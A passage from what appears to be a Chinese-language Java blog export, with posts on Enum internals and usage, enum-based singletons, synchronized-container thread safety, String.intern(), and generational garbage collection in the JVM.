首先我们认为Enum的定义中没有使用Enum&lt;E extends Enum&lt;E&gt;&gt;，那么compareTo方法就要这样定义（因为没有使用泛型，所以就要使用Object，这也是Java中很多方法常用的方式）： 1public final int compareTo(Object o) 当我们调用compareTo方法的时候依然传入两个枚举类型，在compareTo方法的实现中，比较两个枚举的过程是先将参数转化成Enum类型，然后再比较他们的序号是否相等。那么我们这样比较： 12Color.RED.compareTo(Color.RED);Color.RED.compareTo(Season.SPRING); 如果在compareTo方法中不做任何处理的话，那么以上这段代码返回内容将都是true（因为Season.SPRING的序号和Color.RED的序号都是 0 ）。但是，很明显， Color.RED和Season.SPRING并不相等。 但是Java使用Enum&lt;E extends Enum&lt;E&gt;&gt;声明Enum，并且在compareTo的中使用E作为参数来避免了这种问题。 以上两个条件限制Color.RED只能和Color定义出来的枚举进行比较，当我们试图使用Color.RED.compareTo(Season.SPRING);这样的代码是，会报出这样的错误： 1The method compareTo(Color) in the type Enum&lt;Color&gt; is not applicable for the arguments (Season) 他说明，compareTo方法只接受Enum&lt;Color&gt;类型。 Java为了限定形态参数实例化的对象，故要求只能是Enum，这样才能对 compareTo之类的方法所传入的参数进行形态检查。 因为“红色”只有和“绿色”比较才有意义，用“红色”和“春天”比较毫无意义，所以，Java用这种方式一劳永逸的保证像compareTo这样的方法可以正常的使用而不用考虑类型。 PS：在Java中，其实也可以实现“红色”和“春天”比较，因为Enum实现了Comparable接口，可以重写compareTo方法来实现不同的enum之间的比较。 成员变量在Enum中，有两个成员变量，一个是名字(name)，一个是序号(ordinal)。 序号是一个枚举常量，表示在枚举中的位置，从0开始，依次递增。 1234567891011/** * @author hollis */private final String name；public final String name() &#123; return name;&#125;private final int ordinal;public final int ordinal() &#123; return ordinal;&#125; 构造函数前面我们说过，Enum是一个抽象类，不能被实例化，但是他也有构造函数，从前面我们反编译出来的代码中，我们也发现了Enum的构造函数，在Enum中只有一个保护类型的构造函数： 1234protected Enum(String name, int ordinal) &#123; this.name = name; this.ordinal = ordinal;&#125; 文章开头反编译的代码中private Color(String s, int i) { super(s, i); }中的super(s, i);就是调用Enum中的这个保护类型的构造函数来初始化name和ordinal。 其他方法Enum当中有以下这么几个常用方法，调用方式就是使用Color.RED.methodName（params...）的方式调用 123456789101112131415161718192021222324252627282930313233343536public String toString() &#123; return name;&#125;public final boolean equals(Object other) &#123; return this==other;&#125;public final int hashCode() &#123; return super.hashCode();&#125;public final int compareTo(E o) &#123; Enum other = (Enum)o; Enum self = this; if (self.getClass() != other.getClass() &amp;&amp; // optimization self.getDeclaringClass() != other.getDeclaringClass()) throw new ClassCastException(); return self.ordinal - other.ordinal;&#125;public final Class&lt;E&gt; getDeclaringClass() &#123; Class clazz = getClass(); Class zuper = clazz.getSuperclass(); return (zuper == Enum.class) ? clazz : zuper;&#125;public static &lt;T extends Enum&lt;T&gt;&gt; T valueOf(Class&lt;T&gt; enumType,String name) &#123; T result = enumType.enumConstantDirectory().get(name); if (result != null) return result; if (name == null) throw new NullPointerException(\"Name is null\"); throw new IllegalArgumentException( \"No enum constant \" + enumType.getCanonicalName() + \".\" + name);&#125; 方法内容都比较简单，平时能使用的就会也不是很多，这里就不详细介绍了。 用法用法一：常量123public enum Color &#123; RED, GREEN, BLANK, YELLOW &#125; 用法二：switch12345678910111213141516171819enum Signal &#123; GREEN, YELLOW, RED &#125; public class TrafficLight &#123; Signal color = Signal.RED; public void change() &#123; switch (color) &#123; case RED: color = Signal.GREEN; break; case YELLOW: color = Signal.RED; break; case GREEN: color = Signal.YELLOW; break; &#125; &#125; &#125; 用法三：向枚举中添加新方法123456789101112131415161718192021222324252627282930313233public enum Color &#123; RED(\"红色\", 1), GREEN(\"绿色\", 2), BLANK(\"白色\", 3), YELLO(\"黄色\", 4); // 成员变量 private String name; private int index; // 构造方法 private Color(String name, int index) &#123; this.name = name; this.index = index; &#125; // 普通方法 public static String getName(int index) &#123; for (Color c : Color.values()) &#123; if (c.getIndex() == index) &#123; return c.name; &#125; &#125; return null; &#125; // get set 方法 public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getIndex() &#123; return index; &#125; public void setIndex(int index) &#123; this.index = index; &#125; &#125; 用法四：覆盖枚举的方法12345678910111213141516public enum Color &#123; RED(\"红色\", 1), GREEN(\"绿色\", 2), BLANK(\"白色\", 3), YELLO(\"黄色\", 4); // 成员变量 private String name; private int index; // 构造方法 private Color(String name, int index) &#123; this.name = name; this.index = index; &#125; //覆盖方法 @Override public String toString() &#123; return this.index+\"_\"+this.name; &#125; &#125; 用法五：实现接口12345678910111213141516171819202122232425public interface Behaviour &#123; void print(); String getInfo(); &#125; public enum Color implements Behaviour&#123; RED(\"红色\", 1), GREEN(\"绿色\", 2), BLANK(\"白色\", 3), YELLO(\"黄色\", 4); // 成员变量 private String name; private int index; // 构造方法 private Color(String name, int index) &#123; this.name = name; this.index = index; &#125; //接口方法 @Override public String getInfo() &#123; return this.name; &#125; //接口方法 @Override public void print() &#123; System.out.println(this.index+\":\"+this.name); &#125; &#125; 用法六：使用接口组织枚举12345678public interface Food &#123; enum Coffee implements Food&#123; BLACK_COFFEE,DECAF_COFFEE,LATTE,CAPPUCCINO &#125; enum Dessert implements Food&#123; FRUIT, CAKE, GELATO &#125; &#125; Reference Java的枚举类型用法介绍 - https://www.hollischuang.com/archives/195 Java 7 源码学习系列（二）——Enum - https://www.hollischuang.com/archives/92","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】枚举实现单例模式","date":"2019-03-26T14:23:19.000Z","path":"2019/03/26/【Java】枚举实现单例模式/","text":"背景单例模式的不同实现 双重检验锁（double-check locking）123456789101112131415public class Singleton &#123; private volatile static Singleton instance; //声明成 volatile private Singleton ()&#123;&#125; public static Singleton getSingleton() &#123; if (instance == null) &#123; synchronized (Singleton.class) &#123; if (instance == null) &#123; instance = new Singleton(); &#125; &#125; &#125; return instance; &#125;&#125; 饿汉式 static final field12345678910public class Singleton&#123; //类加载时就初始化 private static final Singleton instance = new Singleton(); private Singleton()&#123;&#125; public static Singleton getInstance()&#123; return instance; &#125;&#125; 静态内部类 static nested class123456789public class Singleton &#123; private static class SingletonHolder &#123; private static final Singleton INSTANCE = new Singleton(); &#125; private Singleton ()&#123;&#125; public static final Singleton getInstance() &#123; return SingletonHolder.INSTANCE; &#125; &#125; 分析以上列举了三种单例模式的正常实现。 不知道你有没有注意到，上面的三种实现方法都包含了一个private的构造函数。因此，这是不是意味着，我们就能保证无法创建多个类的实例了呢？ 答案是否定的，即我们仍然有其他的高阶方法来创建多个类的实施，以破解单例模式。 序列化（serialization）/反序列化（deserializations） 反射（reflection） 序列化（serialization）/反序列化（deserializations）问题序列化可能会破坏单例模式。 通过比较一个序列化后的对象实例和其被反序列化后的对象实例，我们发现他们不是同一个对象，换句话说，在反序列化时会创建一个新的实例（即使定义构造函数为private）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class Example &#123; public static void main(String[] args) &#123; Singleton singleton = Singleton.getInstance(); singleton.setValue(1); // Serialize try &#123; FileOutputStream fileOut = new FileOutputStream(\"out.ser\"); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(singleton); out.close(); fileOut.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; singleton.setValue(2); // Deserialize Singleton singleton2 = null; try &#123; FileInputStream fileIn = new FileInputStream(\"out.ser\"); ObjectInputStream in = new ObjectInputStream(fileIn); singleton2 = (Singleton) in.readObject(); in.close(); fileIn.close(); &#125; catch (IOException i) &#123; i.printStackTrace(); &#125; catch (ClassNotFoundException c) &#123; System.out.println(\"singletons.SingletonEnum class not found\"); c.printStackTrace(); &#125; if (singleton == singleton2) &#123; System.out.println(\"Two objects are same\"); &#125; else &#123; System.out.println(\"Two objects are not same\"); &#125; System.out.println(singleton.getValue()); System.out.println(singleton2.getValue()); &#125;&#125;// 我们这里只是以 饿汉式 static final field的实现为例，但上面三种实现都有类似的问题class Singleton implements java.io.Serializable &#123; //类加载时就初始化 private static final Singleton instance = new Singleton(); private int value; private Singleton() &#123; &#125; public static Singleton getInstance() &#123; return instance; &#125; public int getValue() &#123; return value; &#125; public void setValue(int i) &#123; value = i; &#125;&#125; 结果： 123Two objects are not same21 反射（reflection）类似地，使用反射（reflection）可以强行调用私有构造器。 1234567891011121314151617public static void main(String[] args) throws Exception &#123; Singleton singleton = Singleton.INSTANCE; Constructor constructor = singleton.getClass().getDeclaredConstructor(new Class[0]); constructor.setAccessible(true); Singleton singleton2 = (Singleton) constructor.newInstance(); if (singleton == singleton2) &#123; System.out.println(\"Two objects are same\"); &#125; else &#123; System.out.println(\"Two objects are not same\"); &#125; singleton.setValue(1); singleton2.setValue(2); System.out.println(singleton.getValue()); System.out.println(singleton2.getValue());&#125; 结果： 123Two objects are not same12 解决对于序列化时破坏单例模式的问题，我们虽然可以通过以下方式来避免： 123456789101112//测试例子(四种写解决方式雷同)public class Singleton implements java.io.Serializable &#123; public static Singleton INSTANCE = new Singleton(); protected Singleton() &#123; &#125; //反序列时直接返回当前INSTANCE private Object readResolve() &#123; return INSTANCE; &#125; &#125; 因为，在反序列化过程中，如果被序列化的类中定义了readResolve 方法，虚拟机会试图调用对象类里的 readResolve 方法，以进行用户自定义的反序列化。 最终，实现了在序列化/反序列化过程中也不破坏单例模式。 类似地，对于反射时破坏单例模式的问题，我们虽然也可以通过以下方式来避免： 123456789public static Singleton INSTANCE = new Singleton(); private static volatile boolean flag = true;private Singleton()&#123; if(flag)&#123; flag = false; &#125;else&#123; throw new RuntimeException(\"The instance already exists ！\"); &#125;&#125; 但是，问题确实也得到了解决，但这样的解决方案使得代码并不优美。 那有没有更简单更高效的呢？当然是有的，那就是枚举单例了。 枚举（Enum）实现单例模式用枚举写单例实在太简单了！这也是它最大的优点。下面这段代码就是声明枚举实例的通常做法。 123456789101112public enum SingletonEnum &#123; INSTANCE; int value; public int getValue() &#123; return value; &#125; public void setValue(int value) &#123; this.value = value; &#125;&#125; 调用12345678public class EnumDemo &#123; public static void main(String[] args) &#123; SingletonEnum singleton = SingletonEnum.INSTANCE; System.out.println(singleton.getValue()); singleton.setValue(2); System.out.println(singleton.getValue()); &#125;&#125; 我们可以通过EasySingleton.INSTANCE来访问实例，这比调用getInstance()方法简单多了。 由于默认枚举实例的创建是线程安全的，所以不需要担心线程安全的问题。但是在枚举中的其他任何方法的线程安全由程序员自己负责。还有防止上面的通过反射机制调用私用构造器。 这个版本基本上消除了绝大多数的问题。代码也非常简单，实在无法不用。这也是新版的《Effective Java》中推荐的模式。 分析事实上，一个 enum类型是一个特殊的class类型。一个enum声明（declaration）会被编译成这样： 12345678910111213final class SingletonEnum extends Enum&#123; ... public static final SingletonEnum INSTANCE; static &#123; INSTANCE = new SingletonEnum(\"INSTANCE\", 0); $VALUES = (new SingletonEnum[] &#123; INSTANCE &#125;); &#125;&#125; 由于INSTANCE是final类型的，当你的代码第一次访问SingletonEnum.INSTANCE时，SingletonEnum类会被JVM加载并且初始化。 而由于Java类的加载和初始化过程都是线程安全的。所以，创建一个enum类型是线程安全的。 优点1 枚举写法简单123public enum EasySingleton&#123; INSTANCE;&#125; 你可以通过EasySingleton.INSTANCE来访问。 2 枚举自己处理序列化我们知道，以前的所有的单例模式都有一个比较大的问题，就是一旦实现了Serializable接口之后，就不再是单例的了，因为，每次调用 readObject()方法返回的都是一个新创建出来的对象。 有一种解决办法就是使用readResolve()方法来避免此事发生。 但是，为了保证枚举类型像Java规范中所说的那样，每一个枚举类型及其定义的枚举变量在JVM中都是唯一的，在枚举类型的序列化和反序列化上，Java做了特殊的规定。原文如下： Enum constants are serialized differently than ordinary serializable or externalizable objects. The serialized form of an enum constant consists solely of its name; field values of the constant are not present in the form. To serialize an enum constant, ObjectOutputStream writes the value returned by the enum constant’s name method. To deserialize an enum constant, ObjectInputStream reads the constant name from the stream; the deserialized constant is then obtained by calling the java.lang.Enum.valueOf method, passing the constant’s enum type along with the received constant name as arguments. Like other serializable or externalizable objects, enum constants can function as the targets of back references appearing subsequently in the serialization stream. The process by which enum constants are serialized cannot be customized: any class-specific writeObject, readObject, readObjectNoData, writeReplace, and readResolve methods defined by enum types are ignored during serialization and deserialization. Similarly, any serialPersistentFields or serialVersionUID field declarations are also ignored–all enum types have a fixedserialVersionUID of 0L. Documenting serializable fields and data for enum types is unnecessary, since there is no variation in the type of data sent. 大概意思就是说，在序列化的时候，Java仅仅是将枚举对象的name属性输出到结果中，反序列化的时候则是通过java.lang.Enum的valueOf方法来根据名字查找枚举对象。同时，编译器是不允许任何对这种序列化机制的定制，因此禁用了writeObject、readObject、readObjectNoData、writeReplace和readResolve等方法。 我们看一下这个valueOf方法： 123456789public static &lt;T extends Enum&lt;T&gt;&gt; T valueOf(Class&lt;T&gt; enumType,String name) &#123; T result = enumType.enumConstantDirectory().get(name); if (result != null) return result; if (name == null) throw new NullPointerException(\"Name is null\"); throw new IllegalArgumentException( \"No enum const \" + enumType +\".\" + name); &#125; 从代码中可以看到，代码会尝试从调用enumType这个Class对象的enumConstantDirectory()方法返回的map中获取名字为name的枚举对象，如果不存在就会抛出异常。再进一步跟到enumConstantDirectory()方法，就会发现到最后会以反射的方式调用enumType这个类型的values()静态方法，也就是上面我们看到的编译器为我们创建的那个方法，然后用返回结果填充enumType这个Class对象中的enumConstantDirectory属性。 所以，JVM对序列化有保证。 3 枚举实例创建是线程安全的（thread-safe）Reference 深度分析Java的枚举类型—-枚举的线程安全性及序列化问题 - https://www.hollischuang.com/archives/197s","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】同步容器与线程安全问题","date":"2019-03-26T13:50:41.000Z","path":"2019/03/26/【Java】集合类-同步容器与线程安全问题/","text":"问题对于线程安全的集合类（例如Vector）的任何操作是不是都能保证线程安全？ 答案同步容器中的所有自带方法都是线程安全的，因为方法都使用synchronized关键字标注。但是，对这些集合类的复合操作无法保证其线程安全性，而需要客户端通过主动加锁来保证。 分析如果你看过JDK的源码，那么你会发现，像Vector这样的同步容器的所有public方法全都是synchronized的。 也就是说，我们可以在多线程场景中放心地单独双十一这些方法，因为这些方法本身的确是线程安全的。 那么为什么又说复合操作无法保证线程安全呢？ 这里举个栗子，我们定义如下删除Vector中最后一个元素方法： 1234public Object deleteLast(Vector v)&#123; int lastIndex = v.size() - 1; v.remove(lastIndex);&#125; 上面这个方法是一个复合方法，包括size()和remove()，乍一看上去好像并没有什么问题，无论是size()方法还是remove()方法都是线程安全的，那么整个deleteLast方法应该也是线程安全的。 但事实上，如果多线程调用该方法的过程中有，remove方法有可能抛出ArrayIndexOutOfBoundsException。我们看一下remove方法具体实现，什么情况下会抛出这个异常呢。 1234567891011121314public synchronized E remove(int index) &#123; modCount++; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); E oldValue = elementData(index); int numMoved = elementCount - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--elementCount] = null; // Let gc do its work return oldValue;&#125; 从上面代码中可以看出，当index &gt;= elementCount时，会抛出ArrayIndexOutOfBoundsException，也就是说，当当前索引值不再有效的时候，将会抛出这个异常。 由于removeLast方法有可能被多个线程同时调用，因而可能会出现问题。 比如，这个Vector的长度为10，当线程一通过v.size()获得索引值为9，在尝试通过调用remove()方法以删除最后一个元素之前，线程二已经把最后一个元素删除掉了，这时线程一在执行时便会抛出异常。 解决方案为了避免出现类似问题，可以尝试加锁： 123456public void deleteLast() &#123; synchronized (v) &#123; int index = v.size() - 1; v.remove(index); &#125;&#125; 如上，我们在deleteLast()方法中，对v进行加锁，即可保证同一时刻，不会有其他线程删除掉v中的元素。 总结至此，我们已经解释清楚了我们的问题。 问：对于线程安全的集合类（例如Vector）的任何操作是不是都能保证线程安全？ 答：同步容器中的所有自带方法都是线程安全的，因为方法都使用synchronized关键字标注。但是，对这些集合类的复合操作无法保证其线程安全性。需要客户端通过主动加锁来保证。 由于我们自己已知Vector等同步容器是线程安全的，所以我们通常在多线程场景中会直接拿来使用，并不会考虑太多，从而可能导致问题。 所以，我们在使用同步容器的时候，如果只使用其中的自带方法，那么可以放心使用，因为他们是线程安全的，但是如果我们想做复合操作，尤其是涉及到删除容器中的元素时，一定要注意是否需要客户端主动加锁。 下面，我们考虑以下代码，如果在多线程场景中使用会不会出现线程安全问题： 123for (int i = 0; i &lt; v.size(); i++) &#123; System.out.println(v.get(i));&#125; 显然，以上代码在迭代的过程中，并不会出现线程安全问题。但是，如果在程序中还有以下代码有可能被多线程同时调用呢？ 123for (int i = 0; i &lt; v.size(); i++) &#123; v.remove(i);&#125; 由于，不同线程在同一时间操作同一个Vector，其中包括删除操作，那么就同样有可能发生线程安全问题。所以，在使用同步容器的时候，如果涉及到多个线程同时执行删除操作，就要考虑下是否需要加锁。 Reference 同步容器（如Vector）并不是所有操作都线程安全！~ - https://juejin.im/post/5bf4b7876fb9a049d4416cd1","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】String - String.intern()方法","date":"2019-03-26T13:15:28.000Z","path":"2019/03/26/【Java】String-intern/","text":"背景String 类型拥有一个字符串常量池（String Constant Psool），使用字符串常量池包括以下两种方式： 直接使用双引号 String.intern() 直接使用双引号直接使用双引号声明出来的 String 对象会直接存储在字符串常量池中。 String.intern()使用 String 提供的 intern 方法。 String.intern() 是一个 Native 方法。 它的作用是：在运行时，如果在字符串常量池中，包含了一个等于此 String 对象内容的字符串，则返回字符串常量池中该字符串的引用；如果没有，则在字符串常量池中创建一个与此 String 内容相同的字符串，并返回字符串常量池中创建的字符串的引用。 例子分析我们来看看下面的例子： 1234567String s1 = new String(\"计算机\");String s2 = new String(\"计算机\").intern();String s3 = \"计算机\";System.out.println(s2);//计算机System.out.println(s1 == s2);//false，因为一个是堆内存中的String对象，一个是常量池中的String对象System.out.println(s3 == s2);//true，因为两个都是常量池中的String对象 事实上，在 String s2 = new String(&quot;计算机&quot;).intern(); 中的 intern是多余的。 因为，就算不用intern，”计算机”作为一个字面量也会被加载到Class文件常量池（Class constant pool）中，进而加入到运行时常量池（Runtime constant pool）中，为啥还要多此一举呢？ intern()的正确使用那到底什么场景下才需要使用intern呢？ 在解释这个之前，我们先来看下以下代码： 1234String s1 = \"Wei\";String s2 = \"Shi\";String s3 = s1 + s2;String s4 = \"Wei\" + \"Shi\"; 而实际上，上面的代码就等价于下面的写法： 1234String s1 = \"Wei\";String s2 = \"Shi\";String s3 = (new StringBuilder()).append(s1).append(s2).toString();String s4 = \"WeiShi\"; 可以发现，同样是字符串拼接，s3和s4在经过编译器编译后的实现方式并不一样。s1+s2被转化成StringBuilder的append操作，而s4被直接拼接成新的字符串。 如果你感兴趣，你还能发现，String s3 = s1 + s2; 经过编译之后，常量池中是有两个字符串常量的分别是 Wei、Shi（其实Wei和Shi是String s1 = &quot;Wei&quot;;和String s2 = &quot;Shi&quot;;定义出来的），拼接结果WeiShi并不在常量池中。 如果代码只有String s4 = &quot;Wei&quot; + &quot;Shi&quot;;，那么常量池中将只有”WeiShi”而没有”Wei” 和 “Shi”。 究其原因，是因为常量池要保存的是已确定的字面量值。也就是说，对于字符串的拼接，纯字面量和字面量的拼接，会把拼接结果作为常量保存到字符串池。 如果在字符串拼接中，有一个参数是非字面量，而是一个变量的话，整个拼接操作会被编译成StringBuilder.append，这种情况编译器是无法知道其确定值的。只有在运行期才能确定。 那么，有了这个特性了，intern就有用武之地了。那就是很多时候，我们在程序中得到的字符串是只有在运行期才能确定的，在编译期是无法确定的，那么也就没办法在编译期被加入到常量池中。 这时候，对于那种可能经常使用的字符串，使用intern进行定义，每次JVM运行到这段代码的时候，就会直接把常量池中该字面值的引用返回，这样就可以减少大量字符串对象的创建了。 如深入解析String#intern文中举的一个例子： 1234567891011121314151617static final int MAX = 1000 * 10000;static final String[] arr = new String[MAX];public static void main(String[] args) throws Exception &#123; Integer[] DB_DATA = new Integer[10]; Random random = new Random(10 * 10000); for (int i = 0; i &lt; DB_DATA.length; i++) &#123; DB_DATA[i] = random.nextInt(); &#125; long t = System.currentTimeMillis(); for (int i = 0; i &lt; MAX; i++) &#123; arr[i] = new String(String.valueOf(DB_DATA[i % DB_DATA.length])).intern(); &#125; System.out.println((System.currentTimeMillis() - t) + \"ms\"); System.gc();&#125; 分别测试在使用intern()和不使用intern()的耗时差异。 在以上代码中，我们明确的知道，会有很多重复的相同的字符串产生，但是这些字符串的值都是只有在运行期才能确定的。所以，只能我们通过intern显示的将其加入常量池，这样可以减少很多字符串的重复创建。 总结我们再回到文章开头那个疑惑：按照上面的两个面试题的回答，就是说new String也会检查常量池，如果有的话就直接引用，如果不存在就要在常量池创建一个，那么还要intern干啥？难道以下代码是没有意义的吗？ 1String s = new String(\"Wei\").intern(); 而intern中说的“如果有的话就直接返回其引用”，指的是会把字面量对象的引用直接返回给定义的对象。这个过程是不会在Java堆中再创建一个String对象的。 的确，以上代码的写法其实是使用intern是没什么意义的。因为字面量Wei会作为编译期常量被加载到运行时常量池。 Reference 我终于搞清楚了和String有关的那点事儿。 - https://www.hollischuang.com/archives/2517 深入解析String#intern - https://tech.meituan.com/2014/03/06/in-depth-understanding-string-intern.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】垃圾回收 - 分代垃圾回收","date":"2019-03-26T04:39:04.000Z","path":"2019/03/26/【Java】垃圾回收-分代垃圾回收/","text":"为什么要分代？分代的垃圾回收策略，是基于这样一个事实：不同的对象的生命周期是不一样的。 因此，不同生命周期的对象可以采取不同的收集方式，以便提高回收效率。 在Java程序运行的过程中，会产生大量的对象，其中有些对象是与业务信息相关，比如Http请求中的Session对象、线程、Socket连接，这类对象跟业务直接挂钩，因此生命周期比较长。但是还有一些对象，主要是程序运行过程中生成的临时变量，这些对象生命周期会比较短，比如：String对象，由于其不变类的特性，系统会产生大量的这些对象，有些对象甚至只用一次即可回收。 试想，在不进行对象存活时间区分的情况下，每次垃圾回收都是对整个堆空间进行回收，花费时间相对会长。同时，因为每次回收都需要遍历所有存活对象，但实际上，对于生命周期长的对象而言，这种遍历是没有效果的，因为可能进行了很多次遍历，但是他们依旧存在。 因此，分代垃圾回收采用分治的思想，进行代的划分，把不同生命周期的对象放在不同代上，不同代上采用最适合它的垃圾回收方式进行回收。 如何分代？如图所示，虚拟机中的共划分为三个代：新生代（Young Generation）、老年代（Tenured Generation）和持久代（Permanent Generation）。其中持久代主要存放的是Java类的类信息，与垃圾收集要收集的Java对象关系不大。新生代和老年代的划分是对垃圾收集影响比较大的。 新生代（Young Generation）所有新生成的对象首先都是放在新生代的。新生代的目标就是尽可能快速的收集掉那些生命周期短的对象。 新生代分三个区。一个Eden区，两个Survivor区(一般而言)。大部分对象在Eden区中生成。 需要注意，Survivor的两个区是对称的，没先后关系。所以同一个区中，可能同时存在从Eden复制过来对象和从前一个Survivor复制过来的对象。而复制到年老区的只有从第一个Survivor区过来的对象。而且，Survivor区总有一个是空的。同时，根据程序需要，Survivor区是可以配置为多个的（多于两个），这样可以增加对象在新生代中的存在时间，减少被放到老年代的可能。 长期存活的对象进入老年代。虚拟机为每个对象定义了一个年龄计数器，当对象经过了1次Minor GC后，对象就会进入Survivor区，之后每经过一次Minor GC那么对象的年龄加1，知道达到阀值对象进入老年区。 老年代（Tenured Generation）在新生代中经历了N次垃圾回收后仍然存活的对象，就会被放到老年代中。因此，可以认为老年代中存放的都是一些生命周期较长的对象。 大对象通常也直接进入老年代（大对象是指需要大量连续内存空间的对象）。这样做的目的是避免在Eden区和两个Survivor区之间发生大量的内存拷贝。 持久代（Permanent Generation）持久代对垃圾回收没有显著影响，但是有些应用可能动态生成或者调用一些class，例如Hibernate等，在这种时候需要设置一个比较大的持久代空间来存放这些运行过程中新增的类。持久代大小通过-XX:MaxPermSize=&lt;N&gt;进行设置。 注意，在 JDK 1.8中移除整个永久代，取而代之的是一个叫元空间（Metaspace）的区域（永久代使用的是JVM的堆内存空间，而元空间使用的是物理内存，直接受到本机的物理内存限制 什么情况下触发垃圾回收由于对象进行了分代处理，因此垃圾回收区域、时间也不一样。GC有两种类型：Young GC（Minor GC）和Full GC（Major GC）。 针对HotSpot VM的实现，它里面的GC其实准确分类只有两大种： Partial GC：并不收集整个GC堆的模式 Young GC（Minor GC）：只收集新生代的GC Old GC：只收集老年代的GC。只有CMS的concurrent collection是这个模式 Mixed GC：收集整个新生代以及部分老年代的GC。只有G1有这个模式 Full GC：收集整个堆，包括新生代、老年代、持久代（如果存在的话）等所有部分的模式。 Young GC（Minor GC）一般情况下，当新对象生成，并且在Eden申请空间失败时（或者说，新生代的Eden区满），就会触发Young GC（Minor GC），对Eden区域进行GC，清除非存活对象，并且把尚且存活的对象移动到Survivor区。 然后整理Survivor的两个区。这种方式的GC是对新生代的Eden区进行，不会影响到老年代。因为大部分对象都是从Eden区开始的，同时Eden区不会分配的很大，所以Eden区的GC会频繁进行。 因而，一般在这里需要使用速度快、效率高的算法，使Eden区能尽快空闲出来。 注意young GC中有部分存活对象会晋升到老年代，所以young GC后，老年代的占用量通常会有所升高。 新生代通常存活时间较短通常基于Copying算法进行回收，所谓Copying算法就是扫描出存活的对象，并复制到一块新的完全未使用的空间中，对应于新生代，就是在Eden和FromSpace或ToSpace之间copy。新生代采用空闲指针的方式来控制GC触发，指针保持最后一个分配的对象在新生代区间的位置，当有新的对象要分配内存时，用于检查空间是否足够，不够就触发GC。当连续分配对象时，对象会逐渐从Eden到Survivor，最后到老年代。 Old GC老年代与新生代不同，老年代对象存活的时间比较长、比较稳定，因此通常采用标记（Mark）算法来进行回收，所谓标记就是扫描出存活的对象，然后再进行回收未被标记的对象，回收后对用空出的空间要么进行合并、要么标记出来便于下次进行分配，总之目的就是要减少内存碎片带来的效率损耗。 Full GC（Major GC）Full GC 就是收集整个堆，包括新生代，老年代，永久代等收集所有部分的模式。 针对不同的垃圾收集器，Full GC的触发条件可能不都一样。按HotSpot VM的serial GC的实现来看，触发条件是: 当准备要触发一次 young GC 时，如果发现统计数据显示：之前 young GC的平均晋升大小比目前的 old gen剩余的空间大，则不会触发young GC而是转为触发 full GC (因为HotSpot VM的GC里，除了垃圾回收器 CMS的concurrent collection 之外，其他能收集old gen的GC都会同时收集整个GC堆，包括young gen，所以不需要事先准备一次单独的young GC) 如果有永久代（perm gen），要在永久代分配空间但已经没有足够空间时，也要触发一次 full GC System.gc()，heap dump带GC，默认都会触发 full GC HotSpot VM里其他非并发GC的触发条件复杂一些，不过大致原理与上面说的其实一样。 Reference 《深入理解Java虚拟机》 JVM 系列文章之 Full GC 和 Minor GC - https://juejin.im/post/5b8d2a5551882542ba1ddcf8","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】对象的内存分配 - 垃圾回收过程","date":"2019-03-26T04:35:29.000Z","path":"2019/03/26/【Java】对象-对象的内存分配-垃圾回收过程/","text":"对象的内存分配 - 垃圾回收过程1 对象分配到新生代区域中所有new出来的对象都会最先分配到新生代区域中，两个survivor区域初始化是为空的。 2 触发 Minor GC当eden区域满了之后，就引发一次 minor garbage collection(Minor GC)。 3 移动到 S0 Survivor Space当在进行minor garbage collection(Minor GC)后，存活下来的对象就会被移动到S0 survivor space。 4 再次触发 Minor GC当eden区域又填满的时候，又会发生下一次的Minor GC，存活的对象会被移动到survivor区域，而未存活对象会被直接删除。 但是，不同的是，在这次的垃圾回收中，存活对象和之前的survivor中的对象都会被移动到S1 survivor space中。 一旦所有对象都被移动到s1中，那么s0和Eden中的对象就会被清除。 仔细观察图中的对象，数字表示经历的垃圾收集的次数。目前我们已经有不同的年龄对象了。 5 循环触发 Minor GC当eden区域又填满的时候，就会再次触发 Minor GC，从而重复步骤4中的操作，以清除需要回收的对象，并且又切换一次survivor区域，所有存活的对象都被移动至S0。Eden和S1区域中的对象被清除。 6 移动到老年代重复以上步骤，并一直记录对象的年龄。 当有对象的年龄到达一定的阈值的时候，就将新生代中的对象移动到老年代中。在本例中，这个阈值为8。 7 重复以上接下来垃圾收集器就会不断重复以上步骤，不断的进行对象的清除和年代的移动。 我们观察上述过程可以发现，大部分的垃圾收集过程都是在新生代进行的，直到老年代中的内存不够用了才会发起一次 major GC，会进行标记和整理压缩。 Reference 《深入理解Java虚拟机》 深入解析Java垃圾回收机制 - https://www.jianshu.com/p/ee3e9dff5700","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】垃圾收集（Garbage Collection）","date":"2019-03-26T04:31:31.000Z","path":"2019/03/26/【Java】垃圾回收-垃圾收集/","text":"背景程序计数器、虚拟机栈和本地方法栈3个区域随线程而生，随线程而灭。 栈中的栈帧随着方法的进入和推出，而进行着出栈和进栈操作。每一个栈帧中分配多少内存基本上是在类结构确定下来就已知的。 因此这几个区域的内存分配和回收都具有确定性，在方法结束或线程结束时，内存就跟随着回收了。 